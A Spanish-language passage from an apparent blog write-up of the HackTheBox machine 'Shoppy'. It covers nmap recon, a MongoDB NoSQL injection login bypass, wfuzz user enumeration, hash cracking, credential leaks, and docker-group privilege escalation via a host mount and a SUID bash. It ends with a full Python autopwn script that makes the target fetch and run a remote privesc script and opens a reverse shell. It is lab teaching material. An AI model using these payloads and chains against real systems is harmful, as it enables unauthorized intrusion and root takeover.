del escaneoAhora realizamos un escaneo mas profundo para encontrar que servicios corren por cada uno de los puertos descubiertos 22(SSH) - 80(HTTP) - 9093(copycat):❯ nmap -p22,80,9093 -sCV -oN openPortsTCP 10.10.11.180Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 13:09 -05Nmap scan report for 10.10.11.180Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)| 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)|_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)80/tcp open http nginx 1.23.1|_http-title: Did not follow redirect to http://shoppy.htb|_http-server-header: nginx/1.23.19093/tcp open copycat?| fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Content-Type: text/plain; version=0.0.4; charset=utf-8| Date: Tue, 04 Oct 2022 18:03:39 GMT| HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.| TYPE go_gc_cycles_automatic_gc_cycles_total counter| go_gc_cycles_automatic_gc_cycles_total 27| HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.| TYPE go_gc_cycles_forced_gc_cycles_total counter| go_gc_cycles_forced_gc_cycles_total 0| HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.| TYPE go_gc_cycles_total_gc_cycles_total counter| go_gc_cycles_total_gc_cycles_total 27| HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.| TYPE go_gc_duration_seconds summary| go_gc_duration_seconds{quantile=&quot;0&quot;} 3.9011e-05| go_gc_duration_seconds{quantile=&quot;0.25&quot;} 7.1685e-05| go_gc_d| HTTPOptions: | HTTP/1.0 200 OK| Content-Type: text/plain; version=0.0.4; charset=utf-8| Date: Tue, 04 Oct 2022 18:03:40 GMT| HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.| TYPE go_gc_cycles_automatic_gc_cycles_total counter| go_gc_cycles_automatic_gc_cycles_total 27| HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.| TYPE go_gc_cycles_forced_gc_cycles_total counter| go_gc_cycles_forced_gc_cycles_total 0| HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.| TYPE go_gc_cycles_total_gc_cycles_total counter| go_gc_cycles_total_gc_cycles_total 27| HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.| TYPE go_gc_duration_seconds summary| go_gc_duration_seconds{quantile=&quot;0&quot;} 3.9011e-05| go_gc_duration_seconds{quantile=&quot;0.25&quot;} 7.1685e-05|_ go_gc_d1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9093-TCP:V=7.92%I=7%D=10/4%Time=633C757A%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20tSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\xSF:20Request&quot;)%r(GetRequest,2A5A,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\SF:x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Tue,\\x2SF:004\\x20Oct\\x202022\\x2018:03:39\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_SF:automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\xSF:20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles_SF:automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles_SF:total\\x2027\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Count\\SF:x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applicatioSF:n\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo_gcSF:_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total_gcSF:_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n#\\xSF:20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycles_tSF:otal_gc_cycles_total\\x2027\\n#\\x20HELP\\x20go_gc_duration_seconds\\x20A\\x2SF:0summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20collectiSF:on\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo_gc_dSF:uration_seconds{quantile=\\&quot;0\\&quot;}\\x203\\.9011e-05\\ngo_gc_duration_seconds{SF:quantile=\\&quot;0\\.25\\&quot;}\\x207\\.1685e-05\\ngo_gc_d&quot;)%r(HTTPOptions,2F0E,&quot;HTTP/SF:1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\xSF:20charset=utf-8\\r\\nDate:\\x20Tue,\\x2004\\x20Oct\\x202022\\x2018:03:40\\x20GMSF:T\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\xSF:20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20ruSF:ntime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counterSF:\\ngo_gc_cycles_automatic_gc_cycles_total\\x2027\\n#\\x20HELP\\x20go_gc_cyclSF:es_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\xSF:20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_forceSF:d_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x200\\SF:n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20all\\SF:x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_cyclSF:es_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x2027\\n#\\x20HELSF:P\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\x20duSF:ration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_dSF:uration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\&quot;0\\&quot;}\\x203SF:\\.9011e-05\\ngo_gc_duration_seconds{quantile=\\&quot;0\\.25\\&quot;}\\x207\\.1685e-05\\nSF:go_gc_d&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato Nmap Existe un falso positivo en el puerto 9093 por parte de nmap al momento del reconocimiento del mismo9093/tcp open copycat?...1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :...Ya que no disponemos de credenciales omitimos analizar el puerto 22(SSH) y empezamos con el reconocimiento del puerto 80(HTTP). Para ello iniciamos escaneando que tecnologías usa el servicio web: Usando whatweb❯ whatweb 10.10.11.180http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]ERROR Opening: http://shoppy.htb - no address for shoppy.htb &amp;lt;-- Here Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión WappalyzerLo que hacen estas herramientas es realizar diferentes tipos de solicitudes a la web y a traves de la respuesta, ya sea en los headers o código fuente, almacenan las diferentes versiones de las tecnologías que se usa, por ejemplo: Usando nc❯ nc 10.10.11.180 80GET / HTTP/1.0HTTP/1.1 301 Moved Permanently Server: nginx/1.23.1Date: Tue, 04 Oct 2022 18:22:42 GMTContent-Type: text/htmlContent-Length: 169Connection: closeLocation: http://shoppy.htb &amp;lt;-- Here (ask a web browser to load a different web page)&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.23.1&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;En ambos casos, llama nuestra atención la redirección hacia el dominio shoppy.htb al momento de la solicitud al servicio webEntonces sabemos que se aplica Virtual hosting del tipo Domain name, lo cúal permite que una dirección IP funcione para varias paǵinas web. Para ello, debemos agregar el dominio shoppy.htb a nuestro archivo /etc/hosts que se encargará de la resolución de direcciones IP y nombres de dominioecho &quot;10.10.11.180 shoppy.htb&quot; &amp;gt;&amp;gt; /etc/hostsAl entrar a http://10.10.11.180 observaremos que habrá una redirección a http://shoppy.htb Usando ChromiumComo no tenemos una interfaz con funcionalidad procedemos a enumerar que directorios existen en la web, para empezar usamos el script http-enum de nmap❯ nmap -p80 --script http-enum shoppy.htbStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 14:13 -05Nmap scan report for shoppy.htb (10.10.11.180)Host is up (0.10s latency).PORT STATE SERVICE80/tcp open http| http-enum: |_ /login/: Login pageÚnicamente encontramos la ruta /login con la siguiente interfaz:FootholdEs importante saber que al estar frente a una página de logeo podemos aplicar diversar técnicas para evadirlas, ya sea revisando el código fuente hasta o probar distintas inyecciones de autenticación. En está ocasión primero testeamos si podemos enumerar usuarios debido a la respuesta (el clásico El usuario x no existe ó Contraseña incorrecta para el usuario x, etc). Sin embargo conseguimos la misma respuesta para cualquiera de las alternativas Wrong Credentials (manera efectiva de evitar este tipo de ataques de enumeración)En el transcurso de probar diversos payloads y cambiando la cabezera Content-Type para la inyección que veremos luego pude generar un error y se filtro información importante que nos permitió enumerar un usario del sistema jaeger por la ruta /homeLo que si obtuvo un comportamiento raro fue al intentar una Inyección SQL, ya que al ejecutar el clásico input de comilla simple &#39; para verificar una posible respuesta con errores e información respecto a la base de datos existente que corre por detrás, la página se queda cargando y después de un minuto obtenemos un 504 Gateway Time-outDe primeras este comportamiento es sospechoso, y al no darnos resultados pasamos a intentar Inyecciones NoSQL de las bases de datos NoSQL mas usadas, como por ejemplo MongoDB❯ mongo_inyection=&quot;&#39; || 1==1%00&quot;; curl -si -X POST -d &quot;username=$mongo_inyection&amp;amp;password=&quot; http://shoppy.htb/loginHTTP/1.1 302 FoundServer: nginx/1.23.1Date: Tue, 04 Oct 2022 22:33:04 GMTContent-Type: text/plain; charset=utf-8Content-Length: 28Connection: keep-aliveLocation: /adminVary: AcceptSet-Cookie: connect.sid=s%3Allicfo6nBCXrJUxRWtE1kDVYDFb_--rg.HNyc0WXYDLCGhx4xb%2F620KnAtbOwyJod13xbblHrbbw; Path=/; HttpOnlyFound. Redirecting to /adminLo que hacemos aqui es pasarle un nombre de usuario vacío seguido del operador lógico OR (||) y una declaración verdadera 1==1, lo cuál permitira validar la consulta a pesar de pasar un usuario que no existe. Y por último un Null byte (%00) que tiene como rol único terminar el string para poder ignorar validaciones posteriores (en este caso ignorar la valiación del campo password) Aquí puedes encontrar mas información sobre maneras de evadir páginas de logeo https://book.hacktricks.xyz/pentesting-web/login-bypass El problema que existe al logearnos ingresando la inyección es que la web codifica la data a URL, por ello recomiendo pasarlo por burpsuite para decodificarlo y enviarlo Sin embargo, en la web también puedes pasar una inyección con un usuario válido (el clásico admin por defecto) y agregando una comilla para cerrar el campo username original admin&#39; || &#39;Logramos entrar a la web y observamos lo siguiente:Llama la atención que podemos buscar usuarios, y probando usuarios clásicos conseguimos dar respuesta al buscar con el usuario adminAl descargar la exportación nos muestra las credenciales del usuario admin en formato json[ { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67a&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;23c6877d9e2b564ef8b32c3a23de27b2&quot; }]Sin embargo no conseguimos crackearla, pero a pesar de eso tenemos una vía de enumerar más usuarios. Por ello usamos wfuzz y con un diccionario de nombres filtramos por las respuestas que contengan Download export❯ wfuzz -c -w /usr/share/SecLists/Usernames/Names/names.txt --ss &#39;Download export&#39; -b &#39;connect.sid=s%3A-KBUXDEBlgxYGHsr_sTcAWrfSW17csU1.gTfrPHTEMAjVmXuy6kmZYUYSf5zd%2Bfi7agmkHzZPor4&#39; http://shoppy.htb/admin/search-users?username=FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://shoppy.htb/admin/search-users?username=FUZZTotal requests: 10177=====================================================================ID Response Lines Word Chars Payload =====================================================================000000086: 200 55 L 160 W 2720 Ch &quot;admin&quot; 000004909: 200 55 L 160 W 2720 Ch &quot;josh&quot; &amp;lt;-- New user!Obtenemos otro archivo en formato json con credenciales del usuario josh (hash md5 por el formato), así que la crackeamos con una web muy conocida https://crackstation.net/Ahora tenemos las credenciales josh:remembermethisway, podemos intentar por SSH pero no conseguimos ingresar, solo son las credenciales para logearnos en donde ya estamosContinuando con la enumeración ingresamos al puerto 9093 que nos sabemos a ciencia exacta que esObservamos lo que parece ser logs que si actualizamos veremos que va cambiando. Además, de primera vista leemos Go runtime y GC cycles que se repite a menudo y la siguiente información que puede ser de ayuda# HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime....# HELP go_info Information about the Go environment.# TYPE go_info gaugego_info{version=&quot;go1.18.1&quot;} 1...playbooks_plugin_system_playbook_instance_info{Version=&quot;1.29.1&quot;} 1Investigando encontramos la relación del lenguaje Go con GC (Gargabe Collector), el cuál es un sistema que ayuda a gestionar la memoria de una aplicación identificado partes de la memoria que ya no son necesarias. Y por último, muestran el termino playbooks_plugin_system y su version respectivaEntonces relacionando los términos Go enviroment y playbooks plugin encontramos el siguiente repositorio:Buscando sobre Mattermost encontramos que es una plataforma de mensajería instantánea segura y colaborativa para organizaciones y compañias. Además, tiene una aplicación web y probablemente lo que vemos en el puerto 9093 tiene relación con la mismaPero pensando un poco más podemos deducir que probableme tengamos acceso para la aplicación. Para ello podemos recordar el concepto de subdominios que nos sirve para organizar diversas secciones de nuestra web (shoppy.htb) y funcionen de manera independiente. Así que probando el subdominio mattermost.shoppy.htb y aplicando el concepto del principio de Virtual Hosting obtenemos la siguiente paǵina: Si no llegamos a la conclusión anterior tambien podemos Fuzzear en algunos diccionarios❯ for i in /usr/share/SecLists/Discovery/DNS/*; do echo &quot;$i\\n&quot;; grep -n -e &#39;^mattermost$&#39; $i; done/usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt47340:mattermost/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top500.txt/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt/usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt923243:mattermost/usr/share/SecLists/Discovery/DNS/fierce-hostlist.txt/usr/share/SecLists/Discovery/DNS/italian-subdomains.txt/usr/share/SecLists/Discovery/DNS/namelist.txt82865:mattermost/usr/share/SecLists/Discovery/DNS/shubs-stackoverflow.txt/usr/share/SecLists/Discovery/DNS/shubs-subdomains.txt/usr/share/SecLists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt/usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt/usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txtObservamos un panel de logeo e intentamos usar las credenciales que conseguimos anteriormente josh:remembermethisway, nos logeamos y entramos a la aplicación Mattermost:Empezando rápidamente a revisar las funcionalidades de la página encontramos en la sección de menciones un mensaje justamente del usuario que enumeramos al principio jaeger con lo siguiente:Debido a filtración de información obtenemos las credenciales jaeger:Sh0ppyBest@pp!, y como sabemos que el usuario es parte del sistema las usamos para entrar por SSH y conseguir la flag:❯ sshpass -p &#39;Sh0ppyBest@pp!&#39; ssh jaeger@10.10.11.180Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Oct 4 22:17:12 2022 from 10.10.14.99jaeger@shoppy:~$ find / -name user.txt -exec ls -l {} + 2&amp;gt;/dev/null-rw-r----- 1 root jaeger 33 Oct 4 21:53 /home/jaeger/user.txtYa que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores: NoSQL Injection (file:/home/jaeger/ShoppyApp/index.js:)Observamos en la linea 10 que tanto el usuario como la contraseña de insertan dentro de la query sin aplicar algún filtro:...app.post(&#39;/login&#39;, async (req, res) =&amp;gt; { const username = req.body.username; const password = req.body.password; if (username === undefined || password === undefined) { res.status(400).send(&#39;Bad Request&#39;); return; } const passToTest = require(&#39;crypto&#39;).createHash(&#39;md5&#39;).update(password).digest(&#39;hex&#39;); const query = { $where: `this.username === &#39;${username}&#39; &amp;amp;&amp;amp; this.password === &#39;${passToTest}&#39;` }; const result = await User.find(query).maxTimeMS(350); if (result.length === 0) { res.redirect(&#39;/login?error=WrongCredentials&#39;); } else { req.session.username = req.body.username; req.session.save((error) =&amp;gt; { if (error) { res.redirect(&#39;/login?error=WrongCredentials&#39;); } else { res.redirect(&#39;/admin&#39;); } }); } })... Aquí tienes un claro ejemplo de Inyección NoSQL con Mongo https://nullsweep.com/a-nosql-injection-primer-with-mongo/ Revisando los canales de la web Mattermost podemos encontrar comentarios que dan una pista para la Escalada de privilegiosPrivilege EscalationDespués de una enumeración básica del sistema encontramos que tenemos los permisos como usuario deploy para ejecutar el comando /home/deploy/password-managerjaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-managerAl ejecutarlo nos pide la master password:jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: idontknowpassword Access denied! This incident will be reported !Ya que tenemos permisos para descargarlo lo traemos a nuestra máquina para analizarlo y aplicar Ingeniería Inversa con ghidra:Observamos que nuestro input se guarda en la variable local_48 y luego se inserta en la variable local_68 la palabra Sample que luego se compara con nuestro input y si son iguales devolverá el número ‘0’ y nos mostrará el archivo /home/deploy/creds.txt. Entonces ingresamos esa palabra y conseguimos las credenciales del usuario deploy:jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!Como el usuario deploy observamos que pertenecemos al grupo docker, lo cuál de alguna manera nos permite obtener privilegios ya que sabemos que docker requiere permisos de root para su ejecucióndeploy@shoppy:~$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:~$ find / -group docker 2&amp;gt;/dev/null | xargs ls -lsrw-rw---- 1 root docker 0 Oct 5 00:01 /run/docker.sockUsamos docker ps para ver las imágenes que tenemos disponibles y crear un contenedor observamos que nos encontramos como usuario root:deploy@shoppy:~$ docker run -it alpine/ # whoamiroot/ # ls -a. .dockerenv dev home media opt root sbin sys usr.. bin etc lib mnt proc run srv tmp varRevisando la IP y viendo el archivo .dockerenv sabemos que nos es la máquina original. Pero con solo saber que estamos dentro como root ya podemos escalar privilegios en la máquina principalEntonces lo que podemos hacer es crear un contenedor con la imagen que tenemos, montar todo el sistema de archivos de la máquina host (10.10.11.180) a nuestro contenedor (172.17.0.2) y ya que somos root podremos usar todos esos archivos y binarios como si estuvieramos en la misma máquina host:deploy@shoppy:~$ docker run -it -v /:/tmp --rm alpine chroot /tmp bashroot@15d0b34856d2:/# whoamirootroot@15d0b34856d2:/# ls -a. .cache boot etc initrd.img lib lib64 lost+found mnt proc run srv tmp var vmlinuz.old.. bin dev home initrd.img.old lib32 libx32 media opt root sbin sys usr vmlinuzPara un accesso persistente podríamos asignarle permisos SUID al binario /bin/bash para poder ejecutarlo como el propietario y conseguir la flag:deploy@shoppy:~$ docker run -it -v /:/tmp --rm alpine chroot /tmp bashroot@f5a544f92c52:/# chmod u+s /bin/bashroot@f5a544f92c52:/# exitexitdeploy@shoppy:~$ bash -pbash-5.1# whoamirootbash-5.1# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Oct 5 00:01 /root/root.txt Ya saben, no asignemos el grupo docker a cualquier usuario ya que existen varias maneras de escalar privilegios Para un análisis mas a fondo y todo tipo de cosas que puedas hacer respecto al UNIX socket (docker.sock) recomiendo este articulo https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.htmlPara finalizar y como es costumbre hice un autopwn en python aplicando todos los conceptos vistos:import argparseimport hashlibimport jsonimport paramiko # pip install paramikoimport requests # pip install requestsimport shlex import signalimport subprocessimport sysimport timefrom pwn import * # pip install pwntools&quot;&quot;&quot; Autopwn Shoppy HTB Machine--------------------------Author: MarssDate: Sep 30, 2022 &quot;&quot;&quot;# Variablestarget_host = &#39;10.10.11.180&#39;wordlist_filename = &#39;rockyou.txt&#39;# ctrl + cdef signal_handler(signum, frame): sys.exit(&#39;\\n[!] User terminated.&#39;)signal.signal(signal.SIGINT, signal_handler)# make get/post requestdef make_request(session, method, target_url, headers=None, cookies=None, json_data=None): response = &#39;&#39; try: if method == &#39;get&#39;: response = session.get(target_url, headers=headers, cookies=cookies) elif method == &#39;post&#39;: response = session.post(target_url, headers=headers, json=json_data) except Exception as error: print(&#39;[x] Error: %s&#39; % error) return response# read wordlist filedef get_wordlist(): with open(wordlist_filename, &#39;r&#39;, errors=&#39;replace&#39;) as file: # errors=&#39;replace&#39; (UnicodeDecodeError) wordlist = file.readlines() return wordlist# convert password to hash (md5)def to_hash(password): password_hash = hashlib.md5(password.encode()) return password_hash.hexdigest()# crack password hashdef cracking_password(password_hash, wordlist=get_wordlist()): for word in wordlist: word = word.strip(&#39;\\n&#39;) if to_hash(word) == password_hash: return word# connect via ssh and run commandsdef ssh_exec_commands_like(ssh_username, ssh_password, commands): _stdout_commands = [] try: client = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(target_host, port=22, username=ssh_username, password=ssh_password) for command in commands: _stdout = &#39;&#39; if &#39;sudo&#39; in command: _stdin, _stdout, _stderr = client.exec_command(command, get_pty=True) _stdin.write(ssh_password + &#39;\\n&#39;) _stdin.flush() else: _stdin, _stdout, _stderr = client.exec_command(command, get_pty=True) _stdout_commands.append(_stdout.read().decode()) client.close() except Exception as error: print(&#39;[x] Error: %s&#39; % error) return _stdout_commands# bypass login to shoppy.htb (Mongo NoSQLi) and return Josh password hashdef get_josh_password_hash(): josh_password_hash = &#39;&#39; try: session = requests.Session() log.info(&#39;Bypass login&#39;) headers = {&#39;Content-Type&#39;:&#39;application/json&#39;} post_data = { &quot;username&quot; : &quot;admin&#39;||&#39; 1==1&quot;, &quot;password&quot; : &quot;&quot; } _ = make_request(session=session, method=&#39;post&#39;, target_url=&#39;http://shoppy.htb/login&#39;, headers=headers, json_data=post_data) cookies = session.cookies.get_dict() log.info(&#39;Extract password&#39;) _ = make_request(session=session, method=&#39;get&#39;, target_url=&#39;http://shoppy.htb/admin/search-users?username=josh&#39;, cookies=cookies) response = make_request(session=session, method=&#39;get&#39;, target_url=&#39;http://shoppy.htb/exports/export-search.json&#39;, cookies=cookies) josh_password_hash = json.loads(response.text)[0][&#39;password&#39;] session.close() except Exception as error: print(&#39;[x] Error: %s&#39; % error) return josh_password_hash# login mattermost.shoppy.htb (Josh credentials) and return credentials from user Jaegerdef get_jaeger_credentials(josh_password_text): deploy_machine_username = &#39;&#39; deploy_machine_password = &#39;&#39; try: session = requests.Session() log.info(&#39;Persistent login to mattermost API&#39;) headers = {&quot;Content-Type&quot; : &quot;application/json&quot;} post_data = { &quot;login_id&quot; : &quot;josh&quot;, &quot;password&quot; : &quot;{}&quot;.format(josh_password_text) } response = make_request(session=session, method=&#39;post&#39;, target_url=&#39;http://mattermost.shoppy.htb/api/v4/users/login&#39;, headers=headers, json_data=post_data) user_mfa_token = response.headers[&#39;Token&#39;] user_id = json.loads(response.text)[&#39;id&#39;] headers = {&quot;Authorization&quot; : &quot;Bearer {}&quot;.format(user_mfa_token)} response = make_request(session=session, method=&#39;get&#39;, target_url=f&#39;http://mattermost.shoppy.htb/api/v4/users/{user_id}/teams&#39;, headers=headers) user_teams_id = json.loads(response.text)[0][&#39;id&#39;] response = make_request(session=session, method=&#39;get&#39;, target_url=f&#39;http://mattermost.shoppy.htb/api/v4/teams/{user_teams_id}/channels/name/deploy-machine&#39;, headers=headers) deploy_machine_channel_id = json.loads(response.text)[&#39;id&#39;] response = make_request(session=session, method=&#39;get&#39;, target_url=f&#39;http://mattermost.shoppy.htb/api/v4/channels/{deploy_machine_channel_id}/posts&#39;, headers=headers) deploy_machine_username = json.loads(response.text)[&#39;posts&#39;][&#39;ki1a198dybd7icutcjsa1ut6iy&#39;][&#39;message&#39;].split()[16] deploy_machine_password = json.loads(response.text)[&#39;posts&#39;][&#39;ki1a198dybd7icutcjsa1ut6iy&#39;][&#39;message&#39;].split()[18] session.close() except Exception as error: print(&#39;[x] Error: %s&#39; % error) return deploy_machine_username, deploy_machine_password# ssh login (jaeger user) and return credentials from user Deploydef get_deploy_user_credentials(deploy_machine_username, deploy_machine_password): ssh_commands_response = ssh_exec_commands_like( deploy_machine_username, deploy_machine_password, [&#39;sudo -l&#39;, &#39;sudo -u deploy /home/deploy/password-manager &amp;lt;&amp;lt;&amp;lt; &quot;Sample&quot;&#39;]) deploy_user_username = ssh_commands_response[1].strip().split(&#39;\\n&#39;)[-2].split()[1] deploy_user_password = ssh_commands_response[1].strip().split(&#39;\\n&#39;)[-1].split()[1] return deploy_user_username, deploy_user_password# ssh login (deploy user) and get shelldef interactive_shell(args, deploy_user_username, deploy_user_password): init_server = f&#39;/usr/bin/python3 -m http.server {args.port}&#39; server_process = subprocess.Popen(shlex.split(init_server), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) log.info(&#39;Cron process file uploaded&#39;) ssh_commands_response = ssh_exec_commands_like(deploy_user_username, deploy_user_password, [f&#39;wget http://{args.ip}:{args.port}/privesc.sh -O /tmp/privesc.sh&#39;, &#39;chmod +x /tmp/privesc.sh&#39;, f&#39;docker run -it -v /:/tmp --rm alpine sh /tmp/tmp/privesc.sh {args.ip} {args.port}&#39;]) server_process.kill(); time.sleep(5) shell = listen(args.port, timeout=60).wait_for_connection() if shell.sock: log.info(&#39;Press Ctrl + D to exit&#39;) shell.interactive()# exploitation processdef run(args): process = log.progress(&#39;Starting attack&#39;) # (1) bypass login to shoppy.htb (Mongo NoSQLi), extract Josh password hash and crack it process.status(&#39;Extracting and Cracking Josh password hash&#39;) josh_password_text = cracking_password(password_hash=get_josh_password_hash()) log.success(f&#39;Cracked password: {josh_password_text}&#39;) # (2) login mattermost.shoppy.htb (Josh credentials) extract the Jaeger credentials for the Deploy machine process.status(&#39;Extracting the Jaeger credentials for the Deploy machine&#39;) deploy_machine_username, deploy_machine_password = get_jaeger_credentials(josh_password_text) log.success(f&#39;Credentials obtained: {deploy_machine_username}:{deploy_machine_password}&#39;) # (3) ssh login (jaeger user), privileges for specific command and binary reverse engineering (get credentials) process.status(&#39;Extracting the Jaeger credentials for the Deploy machine&#39;) deploy_user_username, deploy_user_password = get_deploy_user_credentials(deploy_machine_username, deploy_machine_password) log.success(f&#39;Credentials obtained: {deploy_user_username}:{deploy_user_password}&#39;) # (4) ssh login (deploy user) and mount root system with docker socket to execute reverse shell process.status(&#39;Abusing docker group membership to run privileged commands&#39;) interactive_shell(args, deploy_user_username, deploy_user_password)if __name__ == &#39;__main__&#39;: parser = argparse.ArgumentParser( description=&#39;Autopwn Shoppy HTB Machine&#39;, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&quot;&quot;&quot;Example: autopwn.py -i 10.10.10.10 -p 4444 &quot;&quot;&quot;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, required=True, help=&#39;specified IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, required=True, help=&#39;specified PORT to receive the shell&#39;) args = parser.parse_args() run(args)# References:#------------# https://api.mattermost.com/#tag/authentication Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0" }, { "title": "Hackthebox Writeup Redpanda", "url": "/posts/HTBRedpanda/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, SSTI, XXE", "date": "2022-09-22 